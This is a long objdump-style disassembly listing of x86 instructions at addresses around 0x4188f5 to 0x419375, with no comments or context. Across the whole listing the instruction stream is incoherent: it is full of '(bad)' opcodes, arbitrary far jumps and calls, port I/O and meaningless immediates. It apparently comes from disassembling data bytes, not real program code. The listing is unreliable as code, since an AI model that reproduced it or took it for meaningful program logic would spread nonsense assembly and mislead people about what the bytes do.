  4188f5:	fisub  WORD PTR [eiz*4+0x749e50f8]
  4188fc:	push   edi
  4188fd:	js     0x418974
  4188ff:	lds    edx,FWORD PTR fs:[ecx]
  418902:	cmp    ebx,edx
  418904:	inc    edi
  418905:	push   ebp
  418906:	lahf   
  418907:	retf   
  418908:	add    BYTE PTR [edx-0x7f],bh
  41890b:	and    ebx,DWORD PTR [edx-0x72]
  41890e:	jno    0x41892b
  418910:	add    eax,0xb209085b
  418915:	int    0xb1
  418917:	xor    esp,eax
  418919:	(bad)  
  41891a:	push   ebp
  41891b:	mov    bh,0x2c
  41891d:	dec    esp
  41891e:	fnstsw WORD PTR [edx+ecx*8]
  418921:	sub    ch,ah
  418923:	or     eax,0xe20c43ed
  418928:	pop    ebp
  418929:	imul   esi,DWORD PTR [ebp+esi*4-0x530d155f],0x1e
  418931:	rcr    BYTE PTR [eax],cl
  418933:	jmp    0xaca7ca20
  418938:	ins    DWORD PTR es:[edi],dx
  418939:	xchg   ecx,esp
  41893b:	out    dx,eax
  41893c:	mov    ss,edx
  41893e:	sbb    ebx,esi
  418940:	cmp    eax,0x7ee38b85
  418945:	xchg   ebx,eax
  418946:	push   DWORD PTR [edx+edi*4+0x7d59194d]
  41894d:	cmc    
  41894e:	in     eax,0x4a
  418950:	push   esi
  418951:	jo     0x4188fc
  418953:	std    
  418954:	adc    eax,0xd6256ac
  418959:	popf   
  41895a:	cmp    bl,BYTE PTR [edi+0x43]
  41895d:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41895f:	fsub   QWORD PTR [ebx+0x10]
  418962:	test   eax,0x21e567bd
  418967:	push   ebp
  418968:	repz jae 0x418980
  41896b:	xchg   edx,eax
  41896c:	enter  0x690,0x99
  418970:	inc    ebp
  418971:	aam    0xbb
  418973:	or     cl,BYTE PTR [ebp-0x52925062]
  418979:	out    dx,eax
  41897a:	inc    esi
  41897b:	jns    0x4189ac
  41897d:	leave  
  41897e:	repnz add ch,dl
  418981:	enter  0x124a,0x97
  418985:	xchg   ebx,eax
  418986:	add    bh,bl
  418988:	shl    esi,0xab
  41898b:	sbb    ecx,DWORD PTR [edi-0x283f31c9]
  418991:	bound  ebx,QWORD PTR [ecx+0x34272e5]
  418997:	jg     0x418978
  418999:	or     BYTE PTR [eax],dl
  41899b:	fcomp  DWORD PTR [edi+0x330bb7b0]
  4189a1:	shl    BYTE PTR [ebp-0x35],cl
  4189a4:	inc    ebp
  4189a5:	jmp    0xe84916be
  4189aa:	mov    ebx,DWORD PTR [ebp-0x54]
  4189ad:	fwait
  4189ae:	add    ebp,esi
  4189b0:	nop
  4189b1:	xor    eax,0x52dba953
  4189b6:	mov    edx,0xb673334c
  4189bb:	and    cl,BYTE PTR [ebx]
  4189bd:	stos   DWORD PTR es:[edi],eax
  4189be:	mov    ?,WORD PTR [edi]
  4189c0:	inc    ebx
  4189c1:	xor    BYTE PTR [edi],al
  4189c3:	out    0x95,al
  4189c5:	ins    BYTE PTR es:[edi],dx
  4189c6:	xchg   ecx,eax
  4189c7:	jb     0x418951
  4189c9:	mov    ebp,0x8585903c
  4189ce:	(bad)  
  4189cf:	push   ecx
  4189d0:	popa   
  4189d1:	sbb    ebp,0x51810272
  4189d7:	sub    ebp,esp
  4189d9:	sub    eax,0xa6bc4cb3
  4189de:	adc    DWORD PTR [esi-0x2698e757],edi
  4189e4:	enter  0x2984,0x34
  4189e8:	popf   
  4189e9:	cmp    ecx,DWORD PTR [esp+edx*2]
  4189ec:	imul   eax,DWORD PTR [eax],0x0
	...
  418a53:	add    BYTE PTR [eax],al
  418a55:	add    BYTE PTR [ecx+edx*4-0x28a2e9ac],cl
  418a5c:	into   
  418a5d:	fwait
  418a5e:	add    bh,cl
  418a60:	mov    ebp,0xfbac5369
  418a65:	cmp    BYTE PTR ds:0xff000109,dh
  418a6b:	add    BYTE PTR [eax],al
  418a6d:	add    BYTE PTR ds:0xde5ba458,dh
  418a73:	sub    ecx,DWORD PTR [ebx]
  418a75:	push   cs
  418a76:	test   al,0x1c
  418a78:	pop    esi
  418a79:	ins    DWORD PTR es:[edi],dx
  418a7a:	sub    ebx,esi
  418a7c:	popa   
  418a7d:	std    
  418a7e:	and    eax,0x5987c69d
  418a83:	mov    dh,0x8
  418a85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a86:	adc    ch,BYTE PTR [ecx-0x26]
  418a89:	out    0x15,eax
  418a8b:	or     dl,BYTE PTR [eax]
  418a8d:	nop
  418a8e:	ins    BYTE PTR es:[edi],dx
  418a8f:	jge    0x418ab9
  418a91:	pop    edi
  418a92:	inc    ecx
  418a93:	jp     0x418a18
  418a95:	imul   esi,DWORD PTR [edx],0x14ce9679
  418a9b:	loope  0x418aa5
  418a9d:	sub    al,0xf1
  418a9f:	and    esp,DWORD PTR ds:0x29ff7727
  418aa5:	neg    al
  418aa7:	mov    eax,ds:0x5a4dd3db
  418aac:	push   ds
  418aad:	loopne 0x418a9d
  418aaf:	aaa    
  418ab0:	ins    DWORD PTR es:[edi],dx
  418ab1:	adc    ecx,ecx
  418ab3:	ins    BYTE PTR es:[edi],dx
  418ab4:	jbe    0x418ac7
  418ab6:	aad    0x61
  418ab8:	jns    0x418a6c
  418aba:	je     0x418a70
  418abc:	xchg   esp,eax
  418abd:	out    0xcb,al
  418abf:	cmp    ecx,DWORD PTR [esp+edi*2]
  418ac2:	pop    ds
  418ac3:	nop
  418ac4:	cmc    
  418ac5:	scas   al,BYTE PTR es:[edi]
  418ac6:	fs in  eax,0x18
  418ac9:	push   esp
  418aca:	mov    ?,WORD PTR [eax+0xc]
  418acd:	in     al,0x1c
  418acf:	cmp    ebx,DWORD PTR [ebx]
  418ad1:	pop    es
  418ad2:	fs jl  0x418a66
  418ad5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ad6:	jnp    0x418a62
  418ad8:	ins    DWORD PTR es:[edi],dx
  418ad9:	das    
  418ada:	xor    BYTE PTR [edi],ah
  418adc:	pop    ebx
  418add:	sub    cl,BYTE PTR [esi]
  418adf:	stos   DWORD PTR es:[edi],eax
  418ae0:	pusha  
  418ae1:	mov    eax,ds:0x2a35a237
  418ae6:	jnp    0x418b64
  418ae8:	(bad)  
  418ae9:	in     eax,dx
  418aea:	popa   
  418aeb:	cdq    
  418aec:	jecxz  0x418b57
  418aee:	clc    
  418aef:	pop    edx
  418af0:	dec    eax
  418af1:	push   ecx
  418af2:	mov    esi,0xa2f28fb0
  418af7:	lods   al,BYTE PTR ds:[esi]
  418af8:	adc    DWORD PTR [ebx*8+0x5a7bb1aa],0x26
  418b00:	adc    DWORD PTR [edi-0x5fd862ed],ebx
  418b06:	push   ds
  418b07:	js     0x418b5b
  418b09:	jg     0x418b36
  418b0b:	out    dx,eax
  418b0c:	and    eax,0x57f2fbc8
  418b11:	xlat   BYTE PTR ds:[ebx]
  418b12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b13:	pop    esi
  418b14:	jecxz  0x418ad3
  418b16:	stos   DWORD PTR es:[edi],eax
  418b17:	aaa    
  418b18:	or     DWORD PTR [eax],0x874fa850
  418b1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b1f:	jno    0x418b94
  418b21:	xchg   edx,eax
  418b22:	mov    esi,0x7ff6d499
  418b27:	mov    ebx,0xdccd0294
  418b2c:	daa    
  418b2d:	add    al,0x1
  418b2f:	xor    ebx,eax
  418b31:	xor    al,0x2c
  418b33:	daa    
  418b34:	sahf   
  418b35:	das    
  418b36:	into   
  418b37:	inc    ebx
  418b38:	sub    DWORD PTR [edi+0x5e],edx
  418b3b:	xor    eax,0x1f8de564
  418b40:	mov    al,ds:0x70b25ed
  418b45:	(bad)  
  418b46:	int    0xf6
  418b48:	cwde   
  418b49:	iret   
  418b4a:	xor    DWORD PTR [edx-0x74],ebx
  418b4d:	xlat   BYTE PTR ds:[ebx]
  418b4e:	dec    ebx
  418b4f:	or     eax,0x7711ff8f
  418b54:	lea    esi,[ebp+0x20209ce1]
  418b5a:	ret    
  418b5b:	stc    
  418b5c:	or     al,BYTE PTR [eax+0x658663d7]
  418b62:	mov    ah,0xdf
  418b64:	pop    ds
  418b65:	or     DWORD PTR [esi],edx
  418b67:	aam    0x3
  418b69:	jns    0x418bd8
  418b6b:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
	...
  418bd5:	add    BYTE PTR [ebx+edx*1-0x7b],bh
  418bd9:	xor    ch,bh
  418bdb:	mov    dh,0xff
  418bdd:	pop    edi
  418bde:	sar    BYTE PTR [ebp+0x3b],1
  418be1:	in     eax,0xd9
  418be3:	inc    esp
  418be4:	xor    eax,0x10a342c
  418be9:	add    bh,bh
  418beb:	add    BYTE PTR [eax],al
  418bed:	add    BYTE PTR [edx+0x5ecfb2ca],cl
  418bf3:	out    dx,eax
  418bf4:	inc    edx
  418bf5:	stos   DWORD PTR es:[edi],eax
  418bf6:	cmp    al,BYTE PTR [ebp-0x475a03d0]
  418bfc:	adc    edi,DWORD PTR [edx-0x3a2e1f0f]
  418c02:	inc    esi
  418c03:	sbb    ecx,esp
  418c05:	jmp    0x418ba7
  418c07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c08:	leave  
  418c09:	in     eax,0xbc
  418c0b:	cmp    ah,BYTE PTR [esi+0x298112ae]
  418c11:	jmp    0x418bb0
  418c13:	jnp    0x418c75
  418c15:	jno    0x418c80
  418c17:	lods   eax,DWORD PTR ds:[esi]
  418c18:	in     al,0x38
  418c1a:	cmp    DWORD PTR [ecx-0x22],edx
  418c1d:	and    eax,DWORD PTR ds:0x5f2f134e
  418c23:	ds xchg ecx,eax
  418c25:	ss xchg ebx,eax
  418c27:	repz les ecx,FWORD PTR [edi-0x5aafcee9]
  418c2e:	sbb    eax,0xd76dc4f9
  418c33:	call   0x72bb:0x48a7910c
  418c3a:	retf   0x95a9
  418c3d:	in     al,0x70
  418c3f:	mov    edx,0xd783cd29
  418c44:	mov    al,ds:0xbfa84712
  418c49:	xchg   edx,eax
  418c4a:	dec    edi
  418c4b:	(bad)
  418c4f:	adc    eax,0x4face205
  418c54:	dec    esi
  418c55:	sub    al,0x6d
  418c57:	cmp    esi,DWORD PTR [eax-0x65]
  418c5a:	mov    ebp,ecx
  418c5c:	int    0x33
  418c5e:	sbb    dh,bh
  418c60:	mov    cl,0x24
  418c62:	lods   eax,DWORD PTR ds:[esi]
  418c63:	add    DWORD PTR [ebx+ecx*1-0x57],esp
  418c67:	or     esp,DWORD PTR [ebx+0x5d]
  418c6a:	outs   dx,DWORD PTR ds:[esi]
  418c6b:	out    dx,eax
  418c6c:	mov    ebx,0x6508b74d
  418c71:	xchg   esi,eax
  418c72:	cmp    eax,0x300b3e42
  418c77:	js     0x418c76
  418c79:	jns    0x418ca5
  418c7b:	aaa    
  418c7c:	out    0x95,al
  418c7e:	cwde   
  418c7f:	jae    0x418c73
  418c81:	dec    ecx
  418c82:	das    
  418c83:	cwde   
  418c84:	mov    ds:0x47cadb,eax
  418c89:	adc    al,0x32
  418c8b:	das    
  418c8c:	mov    edi,fs
  418c8e:	mov    ebx,0x98f6ac9a
  418c93:	call   0x1b8b:0x7449c1b
  418c9a:	add    DWORD PTR [ebx],esi
  418c9c:	int    0x10
  418c9e:	(bad)  [ecx]
  418ca0:	cmp    DWORD PTR [edx+0x52],ecx
  418ca3:	dec    eax
  418ca5:	lock neg DWORD PTR [ecx+ecx*2-0xa]
  418caa:	imul   ebx,DWORD PTR [esi+0x27415e97],0x40cf53c
  418cb4:	jmp    0x5acd:0x79c36e6b
  418cbb:	jns    0x418cdd
  418cbd:	pop    es
  418cbe:	aaa    
  418cbf:	inc    eax
  418cc0:	mov    esp,0x656fa9de
  418cc5:	dec    eax
  418cc6:	mov    dl,0x3a
  418cc8:	xchg   ebp,eax
  418cc9:	add    eax,0x5622bdf0
  418cce:	sahf   
  418ccf:	lds    esp,FWORD PTR [edi]
  418cd1:	scas   al,BYTE PTR es:[edi]
  418cd2:	adc    al,0x4
  418cd4:	out    0xd8,eax
  418cd6:	in     eax,dx
  418cd7:	retf   0x3a70
  418cda:	fidivr DWORD PTR [ecx-0x4]
  418cdd:	in     eax,dx
  418cde:	cmp    eax,0x18e97671
  418ce3:	pop    esp
  418ce4:	ds arpl WORD PTR fs:[edx-0x14],si
  418ce9:	call   0x5cbb35
	...
  418d56:	sti    
  418d57:	inc    edx
  418d58:	out    dx,al
  418d59:	aas    
  418d5a:	(bad)  
  418d5b:	mov    edi,0x6a1ac6fb
  418d60:	(bad)  
  418d61:	ror    BYTE PTR [eax+0x33709e95],cl
  418d67:	or     eax,DWORD PTR [ecx]
  418d69:	add    bh,bh
  418d6b:	add    BYTE PTR [eax],al
  418d6d:	add    BYTE PTR [ecx],ch
  418d6f:	pop    esi
  418d70:	adc    al,0xa1
  418d72:	hlt    
  418d73:	lds    eax,FWORD PTR [esi-0x68]
  418d76:	ffreep st(0)
  418d78:	or     ch,BYTE PTR [edi-0x56]
  418d7b:	dec    edx
  418d7c:	outs   dx,DWORD PTR ds:[esi]
  418d7d:	jg     0x418d92
  418d7f:	sbb    eax,0xd66d326a
  418d84:	xchg   ebx,eax
  418d85:	sbb    ebp,0xffffff9c
  418d88:	in     eax,0x61
  418d8a:	(bad)  
  418d8b:	add    eax,edi
  418d8d:	jo     0x418d8d
  418d8f:	fcmovne st,st(2)
  418d91:	push   esi
  418d92:	dec    edx
  418d93:	mov    ebp,0xbb29aef5
  418d98:	adc    edi,DWORD PTR [ebx]
  418d9a:	inc    esp
  418d9b:	dec    edi
  418d9c:	sub    dh,BYTE PTR [esi]
  418d9e:	mov    ch,0x9b
  418da0:	cmp    esp,esp
  418da2:	lods   eax,DWORD PTR ds:[esi]
  418da3:	lea    edi,[ebp+0x5fc9c7de]
  418da9:	fwait
  418daa:	push   edx
  418dab:	ins    BYTE PTR es:[edi],dx
  418dac:	xchg   esi,eax
  418dad:	cdq    
  418dae:	dec    ebp
  418daf:	adc    eax,0xd3f7ae71
  418db4:	leave  
  418db5:	daa    
  418db6:	lahf   
  418db7:	into   
  418db8:	adc    bl,BYTE PTR [ebx]
  418dba:	adc    al,0x44
  418dbc:	dec    esp
  418dbd:	rol    BYTE PTR [eax],0x97
  418dc0:	shl    edx,0xd2
  418dc3:	sub    ebp,DWORD PTR [ebp-0x4bab24b3]
  418dc9:	adc    ah,BYTE PTR [eax]
  418dcb:	and    al,0x48
  418dcd:	pop    esp
  418dce:	ja     0x418d65
  418dd0:	inc    eax
  418dd1:	or     eax,0xa3328758
  418dd6:	dec    DWORD PTR [ecx]
  418dd8:	sbb    DWORD PTR [eax+0x9],edx
  418ddb:	arpl   WORD PTR [edx+0x4e],bp
  418dde:	out    0xe,eax
  418de0:	ins    BYTE PTR es:[di],dx
  418de2:	adc    eax,0x8141dd76
  418de7:	call   0xc8d5:0x5a1301c6
  418dee:	sub    DWORD PTR [edi],esi
  418df0:	sbb    al,0x2
  418df2:	jg     0x418dc8
  418df4:	dec    esp
  418df5:	or     dl,BYTE PTR [edi]
  418df7:	sbb    DWORD PTR [edx-0x54ca979f],edx
  418dfd:	ret    
  418dfe:	push   ebx
  418dff:	sub    al,BYTE PTR [esi+0x6c686e0b]
  418e05:	int3   
  418e06:	test   DWORD PTR es:0xc81c8b87,eax
  418e0d:	inc    edi
  418e0e:	sbb    esi,eax
  418e10:	call   FWORD PTR [ebx+ebp*8-0x39]
  418e14:	mov    ch,0x45
  418e16:	jl     0x418dd9
  418e18:	mov    esp,0x20622f51
  418e1d:	inc    ecx
  418e1e:	loope  0x418db3
  418e20:	arpl   WORD PTR [eax+eiz*4],sp
  418e23:	push   ecx
  418e24:	xchg   esp,eax
  418e25:	retf   
  418e26:	push   ss
  418e27:	jo     0x418e46
  418e29:	sbb    ebx,DWORD PTR [eax-0x26]
  418e2c:	sahf   
  418e2d:	js     0x418e7e
  418e2f:	push   eax
  418e30:	adc    cl,0x3e
  418e33:	mov    BYTE PTR [edi+edi*8+0x1],ah
  418e37:	(bad)  
  418e38:	fist   DWORD PTR [eax]
  418e3a:	and    DWORD PTR [ebp+0x36898feb],esp
  418e40:	je     0x418e6a
  418e42:	mov    dh,BYTE PTR [ebp-0x4b47df9d]
  418e48:	mov    BYTE PTR [ebx-0x52763d20],al
  418e4e:	popa   
  418e4f:	mov    gs:0xa7958e16,al
  418e55:	cmp    al,0xe1
  418e57:	call   0x81d0:0xf898a9dc
  418e5e:	pop    eax
  418e5f:	pop    esp
  418e60:	pop    ebx
  418e61:	lods   al,BYTE PTR ds:[esi]
  418e62:	(bad)  
  418e63:	js     0x418e7c
  418e65:	xlat   BYTE PTR ds:[ebx]
  418e66:	nop
  418e67:	in     al,dx
  418e68:	xchg   BYTE PTR [edx+eax*1+0x59],dl
  418e6c:	les    eax,FWORD PTR [eax]
	...
  418ed6:	push   cs
  418ed7:	bnd call 0xde7c8b0d
  418edd:	dec    dl
  418edf:	leave  
  418ee0:	and    ah,BYTE PTR [edx+0x21]
  418ee3:	shr    BYTE PTR [edx+0x10c32af],1
  418ee9:	add    bh,bh
  418eeb:	add    BYTE PTR [eax],al
  418eed:	add    BYTE PTR [eax-0x5c],ah
  418ef0:	pop    ecx
  418ef1:	call   0x46f819a9
  418ef6:	addr16 cmp al,0x17
  418ef9:	adc    DWORD PTR [ebx-0x52],eax
  418efc:	ret    
  418efd:	(bad)  
  418efe:	or     eax,0x529d08ac
  418f03:	mov    bh,0xfe
  418f05:	sti    
  418f06:	fmul   DWORD PTR ds:0xad509026
  418f0c:	int    0x5
  418f0e:	sub    DWORD PTR [eax-0x11],esp
  418f11:	addr16 nop
  418f13:	mov    ss,ebp
  418f15:	add    edi,DWORD PTR [esi+eiz*2+0x1d133dff]
  418f1c:	xor    DWORD PTR [esi+0x57e209fc],ebp
  418f22:	sti    
  418f23:	test   DWORD PTR [ecx+0x851bf2e],0x82f23cd2
  418f2d:	mov    edx,0x7d4f3cc0
  418f32:	xchg   esi,eax
  418f33:	mov    eax,0x791c58f8
  418f38:	loopne 0x418ed2
  418f3a:	xchg   DWORD PTR ds:0x782bc48f,eax
  418f40:	fimul  WORD PTR [edx+0x15]
  418f43:	xchg   ebx,eax
  418f44:	cmp    DWORD PTR [esi+ebp*1+0x1cdb5057],eax
  418f4b:	js     0x418f01
  418f4d:	push   ds
  418f4e:	aam    0x54
  418f50:	js     0x418ef4
  418f52:	ret    0x8bbf
  418f55:	and    BYTE PTR [ebx],cl
  418f57:	or     esi,ecx
  418f59:	adc    DWORD PTR [eax],edx
  418f5b:	inc    esp
  418f5c:	aad    0x15
  418f5e:	jb     0x418f4f
  418f60:	xchg   esi,eax
  418f61:	mov    ecx,0xe20d21ae
  418f66:	fild   WORD PTR ds:0x3eb78e9e
  418f6c:	adc    BYTE PTR [ebx+0x5f],ch
  418f6f:	and    BYTE PTR [edx+0x47],0x2a
  418f73:	(bad)  
  418f74:	stc    
  418f75:	fiadd  DWORD PTR [ecx-0x40ac501d]
  418f7b:	in     al,0x81
  418f7d:	pop    ecx
  418f7e:	lahf   
  418f7f:	paddw  mm7,mm6
  418f82:	mov    DWORD PTR [edi-0x2c],esp
  418f85:	test   eax,eax
  418f87:	push   ds
  418f88:	cmp    al,0x32
  418f8a:	outs   dx,DWORD PTR ds:[esi]
  418f8b:	fiadd  DWORD PTR [esi*2-0x435caabb]
  418f92:	mov    BYTE PTR [esi],cl
  418f94:	mov    ds:0xa8f3a904,eax
  418f99:	ret    0xc3ba
  418f9c:	bound  esp,QWORD PTR [esi-0x61]
  418f9f:	out    0x33,eax
  418fa1:	loop   0x418fce
  418fa3:	ret    
  418fa4:	lahf   
  418fa5:	mov    esp,edi
  418fa7:	or     esi,DWORD PTR [eax-0x4ae4ed67]
  418fad:	pushf  
  418fae:	fsubr  st(7),st
  418fb0:	pop    ebx
  418fb1:	push   edi
  418fb2:	jl     0x418fc9
  418fb4:	retf   
  418fb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fb6:	xchg   ebp,eax
  418fb7:	sbb    DWORD PTR [ecx+0x22],eax
  418fba:	pop    ecx
  418fbb:	mov    ds:0x206ec04b,al
  418fc0:	or     eax,0x19675394
  418fc5:	es sti 
  418fc7:	add    ebx,0x58abb11a
  418fcd:	add    eax,0xc179e211
  418fd2:	and    al,0x64
  418fd4:	in     eax,dx
  418fd5:	sub    al,0xbc
  418fd7:	je     0x418fb7
  418fd9:	push   edi
  418fda:	in     al,dx
  418fdb:	jne    0x418f9a
  418fdd:	sbb    BYTE PTR [edx+0x71],bh
  418fe0:	jecxz  0x418f66
  418fe2:	pop    ebp
  418fe3:	push   ecx
  418fe4:	cmp    eax,0x5719e05c
  418fe9:	dec    esp
  418fea:	inc    ebp
  418feb:	cmp    DWORD PTR [ebp+0x0],esi
	...
  419055:	add    BYTE PTR [edi+edx*4],bl
  419058:	in     al,0x47
  41905a:	out    dx,eax
  41905b:	ja     0x41901c
  41905d:	fild   WORD PTR [ecx-0x2b150e59]
  419063:	or     esi,DWORD PTR [edi]
  419065:	pusha  
  419066:	xor    DWORD PTR ds:0xff0001,ecx
  41906c:	add    BYTE PTR [eax],al
  41906e:	(bad)  
  41906f:	call   0x137ecce1
  419074:	xor    dh,bh
  419076:	cmp    bh,BYTE PTR [edx-0x7f0cca76]
  41907c:	inc    edx
  41907d:	jg     0x41900f
  41907f:	fist   DWORD PTR [edx-0x557b0961]
  419085:	xor    eax,0x45804311
  41908a:	xor    BYTE PTR [ecx],0x89
  41908d:	and    BYTE PTR [edx-0x3],bl
  419090:	push   edx
  419091:	mov    ebx,0xadb8d445
  419096:	imul   esi,DWORD PTR [ecx],0x7c
  419099:	lea    edi,[eax-0x642107e5]
  41909f:	stos   DWORD PTR es:[edi],eax
  4190a0:	jge    0x419052
  4190a2:	dec    ebx
  4190a3:	scas   eax,DWORD PTR es:[edi]
  4190a4:	loop   0x41904e
  4190a6:	(bad)  
  4190a7:	rcl    DWORD PTR [ebx+0x22adc098],cl
  4190ad:	test   DWORD PTR [eax+0x37],eax
  4190b0:	dec    ebp
  4190b1:	push   eax
  4190b2:	push   ds
  4190b3:	jle    0x4190c0
  4190b5:	jle    0x4190bc
  4190b7:	xor    DWORD PTR [esi],esp
  4190b9:	int3   
  4190ba:	aad    0x31
  4190bc:	jp     0x419065
  4190be:	into   
  4190bf:	mov    ch,0xc5
  4190c1:	test   al,0xc0
  4190c3:	dec    eax
  4190c4:	or     DWORD PTR [esi+0x7f],eax
  4190c7:	in     eax,dx
  4190c8:	enter  0xd8d,0xf1
  4190cc:	lea    ecx,[edx+ebx*2]
  4190cf:	sub    BYTE PTR [ebp+0x61],dh
  4190d2:	xchg   edi,eax
  4190d3:	shr    BYTE PTR [edx],cl
  4190d5:	push   edx
  4190d6:	sub    eax,0x7462662f
  4190db:	scas   eax,DWORD PTR es:[edi]
  4190dc:	pop    eax
  4190dd:	(bad)  
  4190de:	pop    ecx
  4190df:	xchg   ecx,eax
  4190e0:	jmp    0x1ea5:0x62c49c46
  4190e7:	mov    esp,0xb2468bf5
  4190ec:	cmp    dh,bh
  4190ee:	stos   BYTE PTR es:[edi],al
  4190ef:	dec    eax
  4190f0:	adc    DWORD PTR [eax+eax*4-0x775e3df3],ebx
  4190f7:	pop    ds
  4190f8:	dec    ebx
  4190f9:	arpl   ax,si
  4190fb:	mov    esi,gs
  4190fd:	fstp   DWORD PTR [esi+0x32]
  419100:	fucomip st,st(2)
  419102:	ror    DWORD PTR [edx+0x72],1
  419105:	mul    edx
  419107:	fidiv  WORD PTR [edi-0x19]
  41910a:	push   ecx
  41910b:	lahf   
  41910c:	test   BYTE PTR [ecx-0x66f69681],bl
  419112:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  419114:	imul   ecx,DWORD PTR [esi-0x4e],0xffffffce
  419118:	call   0x86bc9bf
  41911d:	pop    ds
  41911e:	jbe    0x4190b2
  419120:	xor    ecx,DWORD PTR [ecx+0x87384c3]
  419126:	push   ss
  419127:	sub    cl,BYTE PTR [esp+esi*2+0x3d04a97e]
  41912e:	xchg   ebx,eax
  41912f:	scas   al,BYTE PTR es:[edi]
  419130:	push   ds
  419131:	pop    esi
  419132:	or     eax,DWORD PTR [ebp-0x6364243f]
  419138:	mov    al,ds:0xf81e63e4
  41913d:	in     eax,dx
  41913e:	sub    edi,ebx
  419140:	ret    
  419141:	cli    
  419142:	sub    esp,DWORD PTR [edi-0x5d30bfb5]
  419148:	loope  0x419141
  41914a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41914b:	push   0x353b7e84
  419150:	sbb    BYTE PTR [eax+0x68],cl
  419153:	push   ss
  419154:	sbb    eax,0x9b45e4e5
  419159:	dec    ebp
  41915a:	ss mov eax,0x1f833907
  419160:	cli    
  419161:	into   
  419162:	cmp    bh,BYTE PTR [edi]
  419164:	jmp    0x5524:0xe33f027
  41916b:	mov    cl,BYTE PTR [esi+0x0]
	...
  4191d6:	scas   eax,DWORD PTR es:[edi]
  4191d7:	test   DWORD PTR [esi-0xa441be],ebx
  4191dd:	in     eax,dx
  4191de:	inc    esi
  4191df:	push   0x4d
  4191e1:	or     al,BYTE PTR [ecx+esi*8]
  4191e4:	xor    al,0x4f
  4191e6:	xor    BYTE PTR [esi],cl
  4191e8:	add    DWORD PTR [eax],eax
  4191ea:	inc    DWORD PTR [eax]
  4191ec:	add    BYTE PTR [eax],al
  4191ee:	in     al,dx
  4191ef:	inc    ecx
  4191f0:	xchg   edx,eax
  4191f1:	or     eax,0xf1b1ea8
  4191f6:	mov    eax,ds
  4191f8:	es push ecx
  4191fa:	lock push 0x77
  4191fd:	or     DWORD PTR [edi+0x7d],0xffffffbb
  419201:	mov    edx,DWORD PTR [edx+0x4e9e0c43]
  419207:	(bad)  
  419209:	(bad)  
  41920a:	xchg   esi,eax
  41920b:	aam    0x91
  41920d:	leave  
  41920e:	dec    ebp
  41920f:	xlat   BYTE PTR ds:[ebx]
  419210:	sub    cl,al
  419212:	xchg   edx,eax
  419213:	sub    ecx,ecx
  419215:	push   es
  419216:	inc    esi
  419217:	retf   0x2ba7
  41921a:	mov    ecx,0x4ce0cc6d
  41921f:	enter  0xf9c7,0x49
  419223:	icebp  
  419224:	mov    ds,edi
  419226:	scas   al,BYTE PTR es:[edi]
  419227:	fstp   QWORD PTR [eax+0x6eaf40ff]
  41922d:	stos   DWORD PTR es:[edi],eax
  41922e:	mov    edi,0x876c8030
  419233:	sub    eax,0xec1f871d
  419238:	cmp    DWORD PTR [ebp+0x1e58a758],0x77
  41923f:	(bad)
  419242:	out    0xe7,eax
  419244:	test   bh,bl
  419246:	dec    ecx
  419247:	pop    ebx
  419248:	jnp    0x419278
  41924a:	pushf  
  41924b:	pop    esp
  41924c:	mov    ds:0x658965d5,al
  419251:	sub    esp,DWORD PTR [edi]
  419253:	shl    BYTE PTR [esi],0xa9
  419256:	dec    edx
  419257:	xor    al,0xfc
  419259:	or     DWORD PTR [eax-0x7bfd080f],esi
  41925f:	cdq    
  419260:	hlt    
  419261:	mov    edi,0x2a0587c6
  419266:	and    eax,0xc0689546
  41926b:	dec    ebx
  41926c:	retf   0xb8ea
  41926f:	adc    al,0xa8
  419271:	pop    esi
  419272:	xchg   BYTE PTR [edx],dh
  419274:	push   esi
  419275:	inc    ebx
  419276:	cmp    al,0xd4
  419278:	pop    ebx
  419279:	stos   BYTE PTR es:[edi],al
  41927a:	out    dx,al
  41927b:	rcl    ch,cl
  41927d:	sti    
  41927e:	sar    BYTE PTR [ebp-0x40],1
  419281:	and    al,0xe9
  419283:	sub    al,0xab
  419285:	or     ebx,DWORD PTR [ecx-0x3e]
  419288:	pop    esp
  419289:	or     ah,BYTE PTR [esi]
  41928b:	jmp    0xa395:0x8fb83504
  419292:	fld    DWORD PTR [edx]
  419294:	fidiv  WORD PTR [eax+eax*8]
  419297:	sar    DWORD PTR [edx],0x80
  41929a:	gs rol al,cl
  41929d:	sub    eax,0xb3814ea3
  4192a2:	sub    cl,BYTE PTR [esi+eax*2-0x3d5df69c]
  4192a9:	cmp    al,0xf0
  4192ab:	lods   al,BYTE PTR ds:[esi]
  4192ac:	sar    BYTE PTR [edi],0x5d
  4192af:	icebp  
  4192b0:	test   BYTE PTR [ebx+ecx*8-0x3651bc9d],ah
  4192b7:	jo     0x41932e
  4192b9:	aas    
  4192ba:	adc    bh,bh
  4192bc:	lahf   
  4192bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192be:	sub    bl,BYTE PTR [edx+0x50222b89]
  4192c4:	les    ebx,FWORD PTR [edx]
  4192c6:	stos   BYTE PTR es:[edi],al
  4192c7:	mov    esp,0xc12e6d88
  4192cc:	cmp    ah,BYTE PTR es:[eax-0x23]
  4192d0:	and    BYTE PTR [ebp+0xe],bl
  4192d3:	xchg   esp,eax
  4192d4:	sbb    edx,ebp
  4192d6:	ficomp WORD PTR [bx+di]
  4192d9:	in     eax,dx
  4192da:	pop    ebx
  4192db:	lods   eax,DWORD PTR ds:[esi]
  4192dc:	dec    eax
  4192dd:	push   ebp
  4192de:	mov    ds:0xacf92071,eax
  4192e3:	mov    edi,0x249f8584
  4192e8:	(bad)  
  4192e9:	into   
  4192ea:	dec    ecx
  4192eb:	adc    ebx,edi
	...
  419355:	add    BYTE PTR [eax-0xcc4519],ah
  41935b:	jg     0x419306
  41935d:	neg    eax
  41935f:	pop    ss
  419360:	daa    
  419361:	inc    edi
  419362:	dec    ebx
  419363:	das    
  419364:	jmp    0xff00:0x10f2fb0
  41936b:	add    BYTE PTR [eax],al
  41936d:	add    BYTE PTR [edi-0x5c420515],dh
  419373:	mov    ah,0x8d
  419375:	push   edx
